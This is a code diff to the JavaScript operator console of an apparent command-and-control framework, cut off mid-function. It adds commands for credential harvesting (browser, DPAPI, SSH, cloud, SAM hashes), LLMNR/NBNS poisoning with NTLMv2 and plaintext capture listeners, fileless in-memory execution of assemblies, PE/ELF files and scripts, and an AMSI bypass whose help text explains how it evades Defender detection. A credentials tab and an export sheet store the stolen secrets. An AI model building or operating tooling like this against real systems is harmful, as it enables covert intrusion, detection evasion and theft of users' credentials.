@@ -23,13 +23,14 @@ const Sessions = (() => {
   let _suggestItems = [];
   let _suggestIdx   = -1;
   let _resizingCol  = false;         // prevents drag while col-resize active
+  let _stagedFile   = null;          // File object stashed after file picker (for /bof, /assembly, /memexec)
   let _shellUserScrolled = false;    // true when user has manually scrolled up
 
   /* ── session table column definitions ────────────────────────────────────── */
   const _SESS_COLS = [
     { key: 'status',   th: '' },
     { key: 'provider', th: 'Provider' },
-    { key: 'folder',   th: 'Folder' },
+    { key: 'label',    th: 'Label' },
     { key: 'id',       th: 'ID' },
     { key: 'user',     th: 'User' },
     { key: 'host',     th: 'Host' },
@@ -62,17 +63,21 @@ const Sessions = (() => {
     { cmd: '/upload',    hint: '[remote_dest]',              desc: 'Upload local file to agent' },
     { cmd: '/timestomp', hint: '<target> <ref>',            desc: 'Copy timestamps target←ref',       req: 2 },
     { cmd: '/persist',   hint: 'probe|install <id>|remove <id>|status <id>|check',  desc: 'Persistence engine', req: 1, opts: ['probe', 'install', 'remove', 'status', 'check'] },
-    { cmd: '/creds',     hint: 'harvest|coerce|sam|listen start <proto:port>|listen stop [proto:port]|listen dump', desc: 'Credential harvesting', req: 1, opts: [
-      { name: 'harvest',      desc: 'Collect DPAPI, SSH keys, browser DBs, cloud creds' },
-      { name: 'coerce',       desc: 'Force local auth to capture NTLMv2 / SSH agent' },
-      { name: 'sam',          desc: 'Dump SAM/SYSTEM/SECURITY hives (Win, SYSTEM req)' },
-      { name: 'listen start', desc: 'Start listener — smb:445, http:80, smb:8445, etc.' },
-      { name: 'listen stop',  desc: 'Stop all listeners, or specific: listen stop http:80' },
-      { name: 'listen dump',  desc: 'Captured NTLMv2 hashes + Basic creds + poisoner stats' },
+    { cmd: '/creds',     hint: 'harvest [decrypt]|coerce|sam|listen start <proto:port>|listen stop [proto:port]|listen dump', desc: 'Credential harvesting', req: 1, opts: [
+      { name: 'harvest',           desc: 'Collect creds — Firefox/cloud/SSH/FileZilla/mRemoteNG/PS history/Git...' },
+      { name: 'harvest decrypt',   desc: 'OPSEC↑ Also decrypt Chrome/Edge/DPAPI via CryptUnprotectData (Win)' },
+      { name: 'coerce',            desc: 'Force local auth to capture NTLMv2 / SSH agent' },
+      { name: 'sam',               desc: 'In-memory SAM hash extraction (Win, SYSTEM req)' },
+      { name: 'listen start',      desc: 'Start listener — smb:445, http:80 (Basic), http-ntlm:80 (NTLMv2)' },
+      { name: 'listen stop',       desc: 'Stop all listeners, or specific: listen stop http:80' },
+      { name: 'listen dump',       desc: 'Captured credentials (Basic plaintext + NTLMv2 hashes) + poisoner stats' },
     ] },
     { cmd: '/bof',       hint: '<file.obj> [args]',         desc: 'Execute BOF/COFF in-memory (Win)' },
-    { cmd: '/assembly',  hint: '<file.exe> [args]',         desc: 'Execute .NET assembly in-memory (Win)' },
-    { cmd: '/memexec',   hint: '<file.elf> [args]',         desc: 'Execute ELF in-memory via memfd (Linux)' },
+    { cmd: '/assembly',  hint: '<file.exe> [args]',         desc: 'Execute .NET assembly in-memory — .NET only (Win)' },
+    { cmd: '/assembly-amsibypass', hint: '<file.exe> [args]', desc: 'Execute .NET assembly with AMSI bypass (Win)' },
+    { cmd: '/memexec',   hint: '<file> [args]',             desc: 'Execute PE/ELF in-memory (Win+Linux)' },
+    { cmd: '/script',    hint: '<file> [interpreter]',      desc: 'Execute script fileless via stdin pipe (Win+Linux)' },
+    { cmd: '/script-amsibypass', hint: '<file> [interpreter]', desc: 'Execute script fileless + AMSI bypass (Win PS only)' },
     { cmd: '/kill',      hint: '',                          desc: 'Wipe agent + terminate' },
     { cmd: '/stop',      hint: '',                          desc: 'Stop agent, files remain' },
     { cmd: '/history',   hint: '',                          desc: 'Switch to History tab' },
@@ -201,9 +206,7 @@ const Sessions = (() => {
       }
 
       if (def.opts) {
-        const partial = (parts[parts.length - 1] || '').toLowerCase();
-        const isTypingOpt = parts.length > 1;
-        const filter = isTypingOpt ? partial : '';
+        const filter = parts.length > 1 ? parts.slice(1).join(' ').toLowerCase() : '';
         const isObj = def.opts.length && typeof def.opts[0] === 'object';
         const matches = isObj
           ? def.opts.filter(o => o.name.startsWith(filter))
@@ -278,6 +281,7 @@ const Sessions = (() => {
     if (name === 'persist')   _renderPersist();
     if (name === 'control')   _renderControl();
     if (name === 'history')   _renderHistory();
+    if (name === 'creds')     _loadCreds();
   }
 
   function _sessionStatus(s) {
@@ -329,7 +333,7 @@ const Sessions = (() => {
       statsEl.innerHTML = '';
     }
 
-    $$('tr:not(#sess-empty-row)', tbody).forEach(r => r.remove());
+    $$('tr', tbody).forEach(r => r.remove());
 
     // Rebuild thead according to current column order
     const tbl = $('#sess-table');
@@ -341,14 +345,14 @@ const Sessions = (() => {
       }).join('');
     }
 
-    const emptyRow = $('#sess-empty-row');
+    const emptyMsg = $('#sess-empty-msg');
     if (!ids.length) {
-      if (emptyRow) emptyRow.style.display = '';
+      if (emptyMsg) emptyMsg.style.display = '';
       _initColResize('sess-table', 'colw:sess-table');
       _initSessColDrag();
       return;
     }
-    if (emptyRow) emptyRow.style.display = 'none';
+    if (emptyMsg) emptyMsg.style.display = 'none';
 
     ids.forEach(id => {
       const s      = _sessions[id];
@@ -377,10 +381,12 @@ const Sessions = (() => {
       const tr = document.createElement('tr');
       if (id === _activeId) tr.classList.add('sel');
       tr.dataset.id = id;
+      const lockIcon = s.locked ? '<span class="sess-lock" title="Session locked">🔒</span>' : '';
+      const lbl = s.label || chan || '';
       const cellMap = {
-        status:   `<td><span class="st-pill ${st}">${_stLabel(st)}</span></td>`,
+        status:   `<td><span class="st-pill ${st}">${_stLabel(st)}</span>${lockIcon}</td>`,
         provider: `<td class="sess-prov">${providerIcon(prov, 'prov-icon')?.outerHTML || ''}${escHtml(_providerLabel(prov))}</td>`,
-        folder:   `<td class="sess-chan">${escHtml(chan || '—')}</td>`,
+        label:    `<td class="sess-label">${escHtml(lbl || '—')}</td>`,
         id:       `<td class="sess-uid">${escHtml(uid)}</td>`,
         user:     `<td class="sess-user">${escHtml(s.target_user || '—')}${admin ? '<span class="priv-star">*</span>' : ''}</td>`,
         host:     `<td class="sess-host">${escHtml(s.target_host || '—')}</td>`,
@@ -505,29 +511,22 @@ const Sessions = (() => {
       tip += `  3. hashcat -m 5600 to crack NTLMv2`;
       badge.title = tip;
 
-      // Expandable memo
+      // Expandable memo — compact: protocols, start time, total creds (no hashes)
       let memo = badge.querySelector('.listen-badge-memo');
       if (!memo) {
         memo = document.createElement('span');
         memo.className = 'listen-badge-memo';
         badge.appendChild(memo);
       }
-      let memoHtml = '';
-      for (const [key, info] of Object.entries(listeners)) {
-        const since = info.started_at ? new Date(info.started_at).toLocaleString() : '?';
-        const creds = info.creds || [];
-        memoHtml += `<div class="listen-entry"><b>${escHtml(key.toUpperCase())}</b> · since ${escHtml(since)} · ${creds.length} cred${creds.length !== 1 ? 's' : ''}`;
-        if (creds.length > 0) {
-          memoHtml += `<ul class="listen-creds">`;
-          for (const c of creds.slice(-10)) {
-            memoHtml += `<li>${escHtml(c)}</li>`;
-          }
-          if (creds.length > 10) memoHtml += `<li>… and ${creds.length - 10} more</li>`;
-          memoHtml += `</ul>`;
-        }
-        memoHtml += `</div>`;
-      }
-      memo.innerHTML = memoHtml;
+      const protos = keys.map(k => k.toUpperCase());
+      const earliest = Object.values(listeners).reduce((a, b) => {
+        if (!a.started_at) return b; if (!b.started_at) return a;
+        return a.started_at < b.started_at ? a : b;
+      });
+      const since = earliest.started_at ? new Date(earliest.started_at).toLocaleString() : '?';
+      const totalCreds = Object.values(listeners).reduce((n, i) => n + (i.creds || []).length, 0);
+      const protoLabel = count > 1 ? escHtml(protos.join(' + ')) + ' + LLMNR/NBNS' : 'LLMNR/NBNS poisoner active';
+      memo.innerHTML = `<div class="listen-entry">${protoLabel} · since ${escHtml(since)} · ${totalCreds} cred${totalCreds !== 1 ? 's' : ''}</div>`;
     } else {
       badge.style.display = 'none';
       badge.removeAttribute('data-expanded');
@@ -554,8 +553,9 @@ const Sessions = (() => {
     const st = s.polling_stopped ? 'stopped' : agentStatus({ last_heartbeat: dispTs }, s.agent_sleep);
 
     const folder = (s.folder_path || '').replace(/^\/+|\/+$/g, '') || _activeId.slice(0, 8);
+    const displayName = s.label || folder;
     const hn = $('#sh-hostname');
-    if (hn) hn.textContent = folder;
+    if (hn) hn.textContent = displayName;
 
     const pill    = $('#sh-status-pill');
     const pillTxt = $('#sh-status-txt');
@@ -564,6 +564,31 @@ const Sessions = (() => {
 
     _updatePollBtn(s.polling_stopped);
     _updateListenBadge();
+
+    const vmWarn = $('#version-mismatch-warn');
+    if (vmWarn) {
+      const sv = window._serverVersion || '';
+      const av = s.stratum_version || '';
+      if (av && sv && av !== sv) {
+        vmWarn.style.display = '';
+        vmWarn.title = `Agent deployed with v${av}, server is v${sv} — consider re-deploying`;
+      } else {
+        vmWarn.style.display = 'none';
+      }
+    }
+
+    const lockBtn = $('#btn-lock-toggle');
+    if (lockBtn) {
+      if (s.locked) {
+        lockBtn.className = 'btn-lock-toggle locked';
+        lockBtn.textContent = '🔒 Locked';
+        lockBtn.title = 'Session locked — click to unlock';
+      } else {
+        lockBtn.className = 'btn-lock-toggle unlocked';
+        lockBtn.textContent = '🔓 Lock';
+        lockBtn.title = 'Lock session — prevent kill/stop/delete';
+      }
+    }
 
     const promptEl = $('#shell-prompt');
     if (promptEl) promptEl.textContent = _prompt(s.target_os, s.agent_process, s.target_privs);
@@ -599,6 +624,9 @@ const Sessions = (() => {
     if (c === '/sysinfo') return '/sysinfo queued — response arrives in shell';
     if (c === '/stop')    return '/stop queued — agent will exit';
     if (c === '/kill')    return '/kill queued — agent will terminate';
+    const base = c.split(' ')[0];
+    if ((base === '/bof' || base === '/assembly' || base === '/assembly-amsibypass' || base === '/memexec' || base === '/script' || base === '/script-amsibypass') && c.split(/\s+/).length < 2)
+      return `${base} — select file…`;
     return `${c} queued`;
   }
 
@@ -643,7 +671,9 @@ const Sessions = (() => {
 
     const shortId     = (cmdBlock.cmd_id || '').slice(0, 8);
     const isSlashCmd  = (cmdBlock.command || '').startsWith('/');
-    const pendClass   = (cmdBlock.pending && isSlashCmd) ? 'queued' : 'pending';
+    const slashBase   = isSlashCmd ? (cmdBlock.command || '').split(' ')[0] : '';
+    const isFilePick  = slashBase === '/bof' || slashBase === '/assembly' || slashBase === '/assembly-amsibypass' || slashBase === '/memexec' || slashBase === '/script' || slashBase === '/script-amsibypass';
+    const pendClass   = (cmdBlock.pending && isSlashCmd && !isFilePick) ? 'queued' : 'pending';
     const pendText    = escHtml(_pendingText(cmdBlock.command));
     const outputHtml  = cmdBlock.output
       ? `<span class="co-out-label">Output:</span>\n${escHtml(cmdBlock.output)}`
@@ -668,6 +698,7 @@ const Sessions = (() => {
       outEl.innerHTML = prefix + `<span class="co-out-label">Output:</span>\n` + escHtml(content);
     }
     outEl.classList.remove('pending', 'queued');
+    delete outEl.dataset.active;
     if (isError)              outEl.classList.add('error');
     else if (blank || exitOk) outEl.classList.add('co-done');
     else                      outEl.classList.add('hi');
@@ -778,6 +809,7 @@ const Sessions = (() => {
     const hist = $('#shell-hist');
     if (hist) {
       $$('.co.pending, .co.queued', hist).forEach(el => {
+        if (el.dataset.active) return;
         el.textContent = 'cancelled — superseded by ' + (operator || 'another operator');
         el.classList.remove('pending', 'queued');
         el.classList.add('warn');
@@ -790,6 +822,11 @@ const Sessions = (() => {
   function onArtifactsChanged(session_id) {
     if (session_id !== _activeId) return;
     if ($('#tp-artifacts.on')) _loadArtifacts();
+  }
+
+  function onCredentialsChanged(session_id) {
+    if (session_id !== _activeId) return;
+    if ($('#tp-creds.on')) _loadCreds();
   }
 
   /* Throws if the server returned ok:false (lock conflict). */
@@ -903,16 +940,45 @@ const Sessions = (() => {
           '  /persist status <id>               Check status of a specific technique',
           '  Use the Persist tab for a visual overview with one-click install / remove.',
           '',
+          '💉  IN-MEMORY EXECUTION  (Rust native agent only)',
+          '  ───────────────────────────────────────────────────────────────────',
+          '  /bof <file.o> [args]                Execute BOF/COFF in-memory (Windows only)',
+          '  /assembly <file.exe> [args]         Execute .NET assembly via CLR hosting (Windows only)',
+          '    /assembly Seatbelt.exe             — run with no args',
+          '    /assembly Rubeus.exe triage         — run with args',
+          '  /assembly-amsibypass <file.exe> [args]  .NET assembly + AMSI bypass (Windows only)',
+          '    HW breakpoint (DR0) + VEH on AmsiScanBuffer — patchless, no VirtualProtect.',
+          '    Evades Behavior:Win32/AMSI_Patch_T detections. Breakpoint removed after exec.',
+          '    /assembly-amsibypass Rubeus.exe kerberoast',
+          '  /memexec <file> [args]              Execute PE (Win) or ELF (Linux) in-memory',
+          '    Windows: reflective PE loading — maps sections, resolves imports, calls entry point',
+          '    Linux:   memfd_create + execve — anonymous fd, nothing on disk',
+          '  /script <file> [interpreter]       Execute script fileless via stdin pipe (Win+Linux)',
+          '    Windows: /script recon.ps1          — PowerShell (default)',
+          '             /script enum.bat cmd       — force CMD interpreter',
+          '    Linux:   /script recon.sh           — auto-detect from shebang (bash/sh/python)',
+          '             /script recon.py python    — force Python interpreter',
+          '    Script is staged in cloud, downloaded to memory, piped to stdin. Never touches disk.',
+          '  /script-amsibypass <file> [interp]  Script + AMSI bypass (Windows PowerShell only)',
+          '    HW breakpoint on AmsiScanBuffer before spawning PowerShell. Patchless, same as /assembly-amsibypass.',
+          '',
           '🔑  CREDENTIAL HARVESTING',
           '  ───────────────────────────────────────────────────────────────────',
-          '  /creds harvest                     Collect credential files (DPAPI, SSH keys, browser DBs, etc.)',
+          '  /creds harvest                     Collect creds (Firefox, cloud, SSH, FileZilla, mRemoteNG, Git...)',
+          '    Windows: DPAPI/Chrome/Edge/Firefox/WiFi/RDP/Vault/SSH/AWS/Azure/GCloud/Docker/Kube',
+          '             FileZilla/mRemoteNG/PS history/unattend.xml/Git',
+          '    Linux:   shadow/SSH/Firefox/Kerberos/Git/AWS/Docker/Kube/Azure/GCloud/Keyring/WiFi/SSSD/history',
+          '    Firefox master password: staged → firefox_decrypt + hashcat -m 26100',
+          '    DPAPI blobs + master keys: staged → mimikatz dpapi:: or DPAPImk2john -m 15900',
+          '    mRemoteNG: staged → default key mR3m (AES-GCM PBKDF2-SHA1)',
+          '  /creds harvest decrypt             + decrypt Chrome/Edge/DPAPI via CryptUnprotectData (OPSEC↑)',
           '  /creds coerce                      Force local auth to capture hashes (Win: pipe, Linux: SSH agent)',
-          '  /creds sam                         Dump SAM/SYSTEM/SECURITY hives (Windows, requires SYSTEM)',
-          '  /creds listen start <proto:port>   Start NTLMv2 listener + LLMNR/NBNS poisoners',
-          '    /creds listen start smb:445       — SMB listener (default)',
+          '  /creds sam                         In-memory SAM hash extraction (Windows, requires SYSTEM)',
+          '  /creds listen start <proto:port>   Start credential listener + LLMNR/NBNS poisoners',
+          '    /creds listen start smb:445       — SMB listener, captures NTLMv2 (default)',
           '    /creds listen start smb:8445      — SMB on custom port (Windows-friendly)',
-          '    /creds listen start http:80       — HTTP NTLM (browser-triggerable)',
-          '    /creds listen start http:8080     — HTTP NTLM on custom port',
+          '    /creds listen start http:80       — HTTP Basic auth, captures plaintext credentials',
+          '    /creds listen start http-ntlm:80  — HTTP NTLM, captures NTLMv2 hashes',
           '    Multiple listeners can run simultaneously.',
           '  /creds listen stop                 Stop ALL listeners + poisoners',
           '  /creds listen stop http:80         Stop a specific listener',
@@ -1042,13 +1108,16 @@ const Sessions = (() => {
       }
 
       case '/creds': {
-        if (!args.length) { _setOutput(cmdId, 'Usage: /creds harvest|coerce|sam|listen start <proto:port>|listen stop [proto:port]|listen dump', true); break; }
+        if (!args.length) { _setOutput(cmdId, 'Usage: /creds harvest [decrypt]|coerce|sam|listen start <proto:port>|listen stop [proto:port]|listen dump', true); break; }
         const sub = args[0];
         let cd, crid;
         if (sub === 'harvest') {
-          cd = _checkCmd(await API.sendCommand(id, 'CREDS_HARVEST', '/creds harvest'));
+          const hasDecrypt = args.includes('decrypt');
+          const cmdType = hasDecrypt ? 'CREDS_HARVEST_DECRYPT' : 'CREDS_HARVEST';
+          const label = hasDecrypt ? '/creds harvest decrypt' : '/creds harvest';
+          cd = _checkCmd(await API.sendCommand(id, cmdType, label));
           crid = _promoteId(cd);
-          _setQueued(crid, '/creds harvest queued — collecting credentials');
+          _setQueued(crid, `${label} queued — collecting credentials`);
         } else if (sub === 'coerce') {
           cd = _checkCmd(await API.sendCommand(id, 'CREDS_COERCE', '/creds coerce'));
           crid = _promoteId(cd);
@@ -1066,8 +1135,8 @@ const Sessions = (() => {
             if (spec.includes(':')) {
               [proto, port] = spec.split(':');
               proto = proto.toLowerCase();
-              if (!['smb', 'http'].includes(proto)) {
-                _setOutput(cmdId, `Unknown protocol "${proto}". Use smb or http.\n  Examples: /creds listen start http:80  |  /creds listen start smb:8445`, true);
+              if (!['smb', 'http', 'http-ntlm'].includes(proto)) {
+                _setOutput(cmdId, `Unknown protocol "${proto}". Use smb, http, or http-ntlm.\n  Examples: /creds listen start http:80  |  /creds listen start http-ntlm:8080`, true);
                 break;
               }
             } else {
@@ -1085,7 +1154,7 @@ const Sessions = (() => {
                 'Port 445 is occupied by the native LanmanServer service on Windows — the SMB listener will fail to bind.\n\n'
                 + 'Try one of these instead:\n'
                 + '  /creds listen start smb:8445   — SMB on alternate port\n'
-                + '  /creds listen start http:80    — HTTP NTLM (works in browsers)\n\n'
+                + '  /creds listen start http:80    — HTTP Basic auth (plaintext, works in browsers)\n\n'
                 + 'Continue with smb:445 anyway?');
               if (!proceed) { _setOutput(cmdId, 'Aborted — try /creds listen start http:80 or smb:8445'); break; }
             }
@@ -1114,30 +1183,63 @@ const Sessions = (() => {
 
       case '/bof':
       case '/assembly':
-      case '/memexec': {
-        const typeMap = { '/bof': 'bof', '/assembly': 'assembly', '/memexec': 'memexec' };
-        const execType = typeMap[slash];
-        const fileInput = document.createElement('input');
-        fileInput.type = 'file';
-        fileInput.style.display = 'none';
-        document.body.appendChild(fileInput);
-        const argsStr = args.join(' ');
-        fileInput.onchange = async () => {
-          const f = fileInput.files[0];
-          document.body.removeChild(fileInput);
-          if (!f) { _setOutput(cmdId, 'No file selected.', true); return; }
-          _setOutput(cmdId, `Staging ${f.name} (${(f.size/1024).toFixed(1)} KB)...`);
+      case '/assembly-amsibypass':
+      case '/memexec':
+      case '/script':
+      case '/script-amsibypass': {
+        if (args.length && _stagedFile) {
+          const typeMap = { '/bof': 'bof', '/assembly': 'assembly', '/assembly-amsibypass': 'assembly-amsibypass', '/memexec': 'memexec', '/script': 'script', '/script-amsibypass': 'script-amsibypass' };
+          const execType = typeMap[slash];
+          const f = _stagedFile;
+          _stagedFile = null;
+          const argsStr = args.slice(1).join(' ');
+          _appendOutput({
+            ts: new Date().toISOString(), operator: API.getUsername(),
+            command: `${slash} ${f.name}${argsStr ? ' ' + argsStr : ''}`, cmd_id: cmdId, pending: true,
+          });
+          { const _el = document.getElementById(`out-${cmdId}`);
+            if (_el) _el.dataset.active = '1'; }
+          _setQueued(cmdId, `Staging ${f.name} (${(f.size/1024).toFixed(1)} KB)…`);
           try {
             const d = await API.execInline(id, execType, f, argsStr);
             const rid = d?.command?.cmd_id || cmdId;
-            if (d?.command?.cmd_id) _promoteIdManual(cmdId, d.command.cmd_id);
+            if (d?.command?.cmd_id) {
+              _promoteIdManual(cmdId, d.command.cmd_id);
+              _localCmdIds.add(d.command.cmd_id);
+            }
             _setQueued(rid, `${slash} ${f.name} ${argsStr} — executing in-memory`);
           } catch (e) {
             _setOutput(cmdId, `Error: ${e.message || e}`, true);
           }
+          break;
+        }
+        const fileInput = document.createElement('input');
+        fileInput.type = 'file';
+        fileInput.style.display = 'none';
+        document.body.appendChild(fileInput);
+        fileInput.onchange = () => {
+          const f = fileInput.files[0];
+          if (fileInput.parentNode) fileInput.parentNode.removeChild(fileInput);
+          if (!f) return;
+          _stagedFile = f;
+          const inp = $('#cmd-in');
+          if (inp) {
+            inp.value = `${slash} ${f.name} `;
+            inp.disabled = false;
+            inp.focus();
+          }
+          const sendBtn = $('#btn-send');
+          if (sendBtn) sendBtn.disabled = false;
         };
+        fileInput.addEventListener('cancel', () => {
+          if (fileInput.parentNode) fileInput.parentNode.removeChild(fileInput);
+          const inp = $('#cmd-in');
+          if (inp) { inp.disabled = false; inp.focus(); }
+          const sendBtn = $('#btn-send');
+          if (sendBtn) sendBtn.disabled = false;
+        });
         fileInput.click();
-        break;
+        throw { _filePickerOpened: true };
       }
 
       case '/kill': {
@@ -1204,10 +1306,16 @@ const Sessions = (() => {
 
     const hist = $('#shell-hist');
 
-    _appendOutput({
-      ts: new Date().toISOString(), operator: API.getUsername(),
-      command: cmd, cmd_id: cmdId, pending: true,
-    });
+    const _filePickCmds = new Set(['/bof', '/assembly', '/assembly-amsibypass', '/memexec', '/script', '/script-amsibypass', '/upload']);
+    const _isFilePick   = _filePickCmds.has(slash);
+
+    if (!_isFilePick) {
+      _stagedFile = null;
+      _appendOutput({
+        ts: new Date().toISOString(), operator: API.getUsername(),
+        command: cmd, cmd_id: cmdId, pending: true,
+      });
+    }
 
     const _reenable = () => {
       if (inp)     inp.disabled = false;
@@ -1220,6 +1328,7 @@ const Sessions = (() => {
       if (!hist) return;
       $$('.co.pending, .co.queued', hist).forEach(el => {
         if (el.id === `out-${cmdId}`) return; // never cancel our own entry
+        if (el.dataset.active) return;        // protected in-flight file-pick
         el.textContent = 'cancelled — next command sent';
         el.classList.remove('pending', 'queued');
         el.classList.add('warn');
@@ -1233,16 +1342,19 @@ const Sessions = (() => {
       try {
         await _runSlash(slash, parts.slice(1), cmdId);
         // Server accepted — safe to cancel stale pending entries from previous commands.
-        // (Mirroring the non-slash path: never cancel if the server rejected with a lock.)
-        if (hist) {
+        // Skip for file-pick commands: the pending entry was created inside _runSlash
+        // (not before myEl capture), so myEl is null and can't protect it.
+        if (hist && !_isFilePick) {
           $$('.co.pending, .co.queued', hist).forEach(el => {
             if (el === myEl) return;
+            if (el.dataset.active) return;
             el.textContent = 'cancelled — next command sent';
             el.classList.remove('pending', 'queued');
             el.classList.add('warn');
           });
         }
       } catch (e) {
+        if (e?._filePickerOpened) return;
         _setOutput(cmdId, `Error: ${e.message}`, true);
         Toast.error('Command failed', e.message);
       } finally { _reenable(); }
@@ -1288,9 +1400,12 @@ const Sessions = (() => {
     if (mime.includes('javascript') || mime.includes('ecmascript')) return 'JS';
     if (mime.includes('sqlite') || mime.includes('sql')) return 'DB';
     if (mime.includes('x509') || mime.includes('pkix') || mime.includes('pem')) return 'CERT';
-    if (mime === 'application/octet-stream') return 'BIN';
+    if (mime.includes('krb5'))   return 'KRB';
+    if (mime.includes('php'))    return 'PHP';
+    if (mime.includes('shellscript')) return 'SHELL';
+    if (mime === 'application/octet-stream') return 'BLOB';
     const sub = (mime.split('/')[1] || mime).replace(/^x-/, '').replace(/[^a-z0-9]/gi, '').toUpperCase();
-    return sub.slice(0, 6) || 'BIN';
+    return sub.slice(0, 6) || 'BLOB';
   }
 
   function _loadArtifacts() {
@@ -1322,7 +1437,7 @@ const Sessions = (() => {
         const remotePath = f.remote_path || f.filename;
         const nameCell   = _exfilShowPath
           ? `<code class="exfil-path" title="${escHtml(remotePath)}">${escHtml(remotePath)}</code>`
-          : `<code>${escHtml(f.filename)}</code>`;
+          : `<code class="exfil-path">${escHtml(f.filename)}</code>`;
         const typeLabel  = _mimeToLabel(f.mime_type);
         const md5Short   = f.md5 ? f.md5.slice(0, 12) : '—';
         const md5Cell    = f.md5
@@ -1332,7 +1447,7 @@ const Sessions = (() => {
           ? `<a href="${escHtml(dlUrl)}" download="${escHtml(f.filename)}" class="btn-sm btn-sm-ghost" title="Download">${icoDown}<span class="btn-label"> Down</span></a>`
           : `<span class="ts">${f.exists ? 'local only' : 'missing'}</span>`;
         const showBtn = canAct
-          ? `<button class="btn-sm btn-sm-ghost js-show-file" data-url="${escHtml(dlUrl)}" data-name="${escHtml(f.filename)}" data-size="${f.size_bytes ?? ''}" title="Preview">${icoEye}<span class="btn-label"> View</span></button>`
+          ? `<button class="btn-sm btn-sm-ghost js-show-file" data-url="${escHtml(dlUrl)}" data-name="${escHtml(f.filename)}" data-size="${f.size_bytes ?? ''}" data-type="${escHtml(typeLabel)}" data-md5="${escHtml(f.md5 || '')}" title="Preview">${icoEye}<span class="btn-label"> View</span></button>`
           : '';
         const delBtn  = f.exists
           ? `<button class="btn-sm btn-sm-ghost btn-sm-danger js-del-file" data-rel="${escHtml(relPath)}" data-name="${escHtml(f.filename)}" title="Delete">${icoTras}<span class="btn-label"> Del</span></button>`
@@ -1343,7 +1458,7 @@ const Sessions = (() => {
           `<td class="ts">${f.size_bytes != null ? _fmtSize(f.size_bytes) : '—'}</td>` +
           `<td>${md5Cell}</td>` +
           `<td class="ts" style="white-space:nowrap">${escHtml(fmtDateTime(f.timestamp))}</td>` +
-          `<td class="af-actions">${dlCell}${showBtn}${delBtn}</td>`;
+          `<td class="af-actions"><div class="af-actions-inner">${dlCell}${showBtn}${delBtn}</div></td>`;
         tbody.appendChild(tr);
       });
     }).catch(() => {
@@ -1374,7 +1489,7 @@ const Sessions = (() => {
     _loadUploads();
   }
 
-  async function _showFilePreview(url, name, sizeRaw) {
+  async function _showFilePreview(url, name, sizeRaw, fileType, md5) {
     const pre   = $('#file-preview-body');
     const title = $('#file-preview-title');
     const meta  = $('#file-preview-meta');
@@ -1402,7 +1517,10 @@ const Sessions = (() => {
         const text = new TextDecoder('utf-8', { fatal: false }).decode(buf);
         pre.textContent = text;
       }
-      meta.textContent = `${_fmtSize(size)} · ${name}`;
+      const parts = [_fmtSize(size)];
+      if (fileType) parts.push(fileType);
+      if (md5) parts.push(`MD5: ${md5}`);
+      meta.textContent = parts.join(' · ');
     } catch (err) {
       pre.textContent = `Error: ${err.message}`;
     }
@@ -1423,13 +1541,6 @@ const Sessions = (() => {
     Modal.open('upload-modal');
     setTimeout(() => (prefilledRemote ? fileInp : remoteFld).focus(), 80);
 
-    const cleanupCmdOnCancel = () => {
-      if (shellCmdId) {
-        const el = document.getElementById(`out-${shellCmdId}`);
-        if (el) el.remove();
-      }
-    };
-
     submitBtn.onclick = async () => {
       const file       = fileInp.files?.[0];
       const remotePath = remoteFld.value.trim();
@@ -1439,6 +1550,11 @@ const Sessions = (() => {
       submitBtn.disabled = true;
       statusEl.style.color = 'var(--text-muted)';
       statusEl.textContent = `Uploading ${file.name} to staging…`;
+
+      _appendOutput({
+        ts: new Date().toISOString(), operator: API.getUsername(),
+        command: `/upload ${file.name} → ${remotePath}`, cmd_id: shellCmdId, pending: true,
+      });
 
       try {
         const result = await API.uploadFile(_activeId, file, remotePath);
@@ -1453,13 +1569,10 @@ const Sessions = (() => {
       } catch (err) {
         statusEl.style.color = 'var(--accent)';
         statusEl.textContent = `Error: ${err.message || err}`;
+        _setOutput(shellCmdId, `Error: ${err.message || err}`, true);
         submitBtn.disabled = false;
       }
     };
-
-    // Clean up pending shell command if modal is closed without submitting
-    const cancelBtn = $('#upload-modal-cancel');
-    if (cancelBtn) cancelBtn.addEventListener('click', cleanupCmdOnCancel, { once: true });
   }
 
   /* Extract path relative to downloads/ for the download URL */
@@ -1569,13 +1682,14 @@ const Sessions = (() => {
 
   async function _exportXlsx(sessionId, histData) {
     await _loadXlsx();
-    const [artifacts, uploads] = await Promise.all([
+    const [artifacts, uploads, credentials] = await Promise.all([
       API.artifacts(sessionId).catch(() => []),
       API.listUploads(sessionId).catch(() => []),
+      API.listCredentials(sessionId).catch(() => []),
     ]);
 
     const hist = histData || [];
-    if (!hist.length && !artifacts.length && !uploads.length) return false;
+    if (!hist.length && !artifacts.length && !uploads.length && !credentials.length) return false;
 
     const wb = XLSX.utils.book_new();
 
@@ -1595,6 +1709,15 @@ const Sessions = (() => {
     const ulRows = [['Timestamp', 'Filename', 'Remote Path', 'Size (bytes)', 'CMD ID', 'Status']];
     uploads.forEach(u => ulRows.push([_ts(u.timestamp), u.filename ?? '', u.remote_path ?? '', u.size ?? '', u.cmd_id ?? '', u.status || 'on target']));
     XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(ulRows), 'Uploads');
+
+    // Sheet 4 — Credentials
+    const credRows = [['Timestamp', 'Source', 'Username', 'Secret', 'Type', 'Domain', 'Protocol', 'Host', 'Port', 'Notes', 'Operator']];
+    credentials.forEach(c => credRows.push([
+      _ts(c.timestamp), c.source ?? '', c.username ?? '', c.secret ?? '',
+      c.secret_type ?? '', c.domain ?? '', c.protocol ?? '', c.host ?? '',
+      c.port ?? '', c.notes ?? '', c.operator ?? '',
+    ]));
+    XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(credRows), 'Credentials');
 
     XLSX.writeFile(wb, `report_${sessionId}.xlsx`);
     return true;
@@ -1786,6 +1909,298 @@ const Sessions = (() => {
         if (sessionId === _activeId && $('#tp-persist.on')) _renderPersist();
       }
     } catch { /* history unavailable */ }
+  }
+
+  /* ── Credentials tab ─────────────────────────────────────────────────────── */
+
+  let _credsCache = {};
+
+  async function _loadCreds() {
+    if (!_activeId) return;
+    try {
+      _credsCache[_activeId] = await API.listCredentials(_activeId);
+    } catch { /* ignore */ }
+    _renderCreds();
+  }
+
+  function _renderCreds() {
+    const tbody = $('#creds-tbody');
+    if (!tbody || !_activeId) return;
+    const creds = _credsCache[_activeId] || [];
+    const countEl = $('#cred-count');
+    if (countEl) countEl.textContent = creds.length ? `${creds.length} credential${creds.length !== 1 ? 's' : ''}` : '';
+
+    if (!creds.length) {
+      tbody.innerHTML = '<tr><td colspan="9" class="ts" style="text-align:center;padding:1.2rem">No credentials captured</td></tr>';
+      return;
+    }
+
+    let html = '';
+    for (const c of creds) {
